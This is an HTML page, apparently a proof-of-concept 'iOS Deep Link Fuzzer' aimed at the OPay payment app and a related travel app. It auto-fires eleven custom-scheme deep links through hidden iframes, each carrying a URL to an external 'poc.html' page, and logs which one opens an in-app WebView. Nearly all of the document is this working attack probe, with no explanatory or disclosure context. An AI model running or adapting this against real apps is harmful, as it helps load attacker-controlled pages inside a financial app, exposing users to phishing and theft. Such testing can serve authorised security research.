<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Link Tester</title>
    <style>
        body{font-family:-apple-system,sans-serif;background:#1a1a1a;color:#fff;padding:15px;font-size:13px;}
        .btn{display:block;background:#00c853;color:#fff;padding:12px;border-radius:8px;font-weight:bold;text-decoration:none;margin:6px 0;font-size:13px;text-align:center;}
        .tried{background:#555;}
        #log{background:#000;color:#0f0;padding:10px;margin-top:15px;font-family:monospace;font-size:10px;height:250px;overflow-y:scroll;border:1px solid #333;word-break:break-all;}
        h3{margin:0 0 10px;}
        #status{color:#ff0;margin-bottom:10px;}
    </style>
</head>
<body>
    <h3>iOS Deep Link Fuzzer</h3>
    <div id="status">Tap any button or wait 3s for auto-run</div>
    <div id="btns"></div>
    <div id="log"></div>
    <script>
    var P="https://zugonwobi.github.io/test/poc.html";
    var V=[
        ["1 otravel scheme=","otravel://schemedispatcher?scheme="+encodeURIComponent(P)],
        ["2 otravel url=","otravel://schemedispatcher?url="+encodeURIComponent(P)],
        ["3 opay webview","opay://webview?url="+encodeURIComponent(P)],
        ["4 opay applink","opay://applink?url="+encodeURIComponent(P)],
        ["5 opay web","opay://web?url="+encodeURIComponent(P)],
        ["6 opaypay webview","opaypay://webview?url="+encodeURIComponent(P)],
        ["7 otravel webview","otravel://webview?url="+encodeURIComponent(P)],
        ["8 otravel open","otravel://open?url="+encodeURIComponent(P)],
        ["9 opay browser","opay://browser?url="+encodeURIComponent(P)],
        ["10 opay navigate","opay://navigate?url="+encodeURIComponent(P)],
        ["11 opay-payment","opay-payment://webview?url="+encodeURIComponent(P)]
    ];
    var logEl=document.getElementById("log");
    function log(m){var d=document.createElement("div");d.textContent="> "+m;logEl.appendChild(d);logEl.scrollTop=99999;}

    function fire(url,label){
        log("FIRING: "+label);
        log("URL: "+url);
        var f=document.createElement("iframe");
        f.style.display="none";
        f.src=url;
        document.body.appendChild(f);
        setTimeout(function(){try{document.body.removeChild(f);}catch(e){}},3000);
    }

    var btns=document.getElementById("btns");
    for(var i=0;i<V.length;i++){
        (function(idx){
            var a=document.createElement("a");
            a.className="btn";
            a.href="#";
            a.textContent=V[idx][0];
            a.onclick=function(e){e.preventDefault();fire(V[idx][1],V[idx][0]);a.className="btn tried";return false;};
            btns.appendChild(a);
        })(i);
    }

    var ci=0;
    function autoRun(){
        if(ci>=V.length){log("== ALL DONE ==");document.getElementById("status").textContent="Done. Check which one opened WebView.";return;}
        var v=V[ci];
        document.getElementById("status").textContent="Testing "+v[0]+"...";
        fire(v[1],v[0]);
        var b=btns.children[ci];if(b)b.className="btn tried";
        ci++;
        setTimeout(autoRun,4000);
    }
    log("Ready. Auto-start in 3s...");
    setTimeout(autoRun,3000);
    </script>
</body>
</html>
